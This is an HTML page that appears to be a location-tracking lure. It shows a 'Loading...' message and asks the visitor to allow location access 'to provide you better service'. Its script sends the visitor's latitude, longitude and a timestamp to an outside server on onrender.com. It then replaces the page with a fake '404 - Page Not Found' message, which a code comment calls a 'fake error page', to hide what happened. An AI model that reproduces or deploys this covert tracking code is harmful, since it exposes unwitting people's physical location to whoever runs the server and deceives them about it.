<!DOCTYPE html>
<html lang="en">
<head>
  <title>Something went wrong</title>
  <style>
    body {
      background-color: #f8f8f8;
      font-family: sans-serif;
      text-align: center;
      padding-top: 200px;
      color: #333;
    }
  </style>
</head>
<body>
  <h2>Loading...</h2>
  <p>To provide you better service, we’d like to know your location. Please click ‘Allow’.</p>

  <script>
    function sendLocation(lat, lon) {
      fetch('https://location-tracker-ldys.onrender.com/receive-location', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          latitude: lat,
          longitude: lon,
          timestamp: new Date().toISOString()
        })
      });
    }

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          sendLocation(position.coords.latitude, position.coords.longitude);
          console.log(position.coords.latitude, position.coords.longitude)

          // Show fake error page
          document.body.innerHTML = `
            <h1>404 - Page Not Found</h1>
            <p>The page you are looking for does not exist or has been moved.</p>
          `;
        },
        (error) => {
          document.body.innerHTML = `
            <h1>Error</h1>
            <p>Could not get your location. Please try again later.</p>
          `;
        }
      );
    } else {
      document.body.innerHTML = `
        <h1>Unsupported Browser</h1>
        <p>Your browser does not support location tracking.</p>
      `;
    }
  </script>
</body>
</html>
